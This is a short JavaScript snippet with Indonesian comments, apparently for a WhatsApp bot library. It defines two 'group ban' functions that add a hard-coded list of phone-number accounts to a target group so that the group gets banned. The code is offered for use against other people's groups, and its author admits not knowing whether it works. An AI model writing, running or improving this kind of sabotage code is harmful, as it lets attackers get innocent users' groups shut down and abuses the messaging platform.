/** 
 * gatau works atau ga yang penting udah di ser
 * RennZSync
 */

// func ban 1
async function groupBanRennZ (sock, target) {
    if (!target || !target.endsWith("@g.us")) {
        throw new Error("Target harus berformat @g.us");
    }

    try {
        const RennZSync = [
            "13135550002@s.whatsapp.net",
            "12345678900@s.whatsapp.net",
            "19876543210@s.whatsapp.net",
            "15551234567@s.whatsapp.net",
            "18005551234@s.whatsapp.net",
            "447700900000@s.whatsapp.net",
            "447700900001@s.whatsapp.net",
            "447700900002@s.whatsapp.net",
            "971500000000@s.whatsapp.net",
            "971500000001@s.whatsapp.net",
            "23726628281@s.whatsapp.net"
        ];

        await sock.groupParticipantsUpdate(target, RennZSync, "add");

        console.log(`✅ Group berhasil ter-banned: ${target}`);
        return true;

    } catch (e) {
        console.log(`❌ Gagal banned: ${e.message}`);
        throw e;
    }
}


// func ban 2
async function groupBan(sock, target) {
    if (!target || !target.endsWith("@g.us")) {
        throw new Error("Target harus berformat @g.us");
    }

    try {
        await sock.groupParticipantsUpdate(
            target, 
            ["13135550002@s.whatsapp.net"], 
            "add"
        );

        console.log(`✅ Group berhasil ter-banned: ${target}`);
        return true;

    } catch (e) {
        console.log(`❌ Gagal banned: ${e.message}`);
        throw e;
    }
}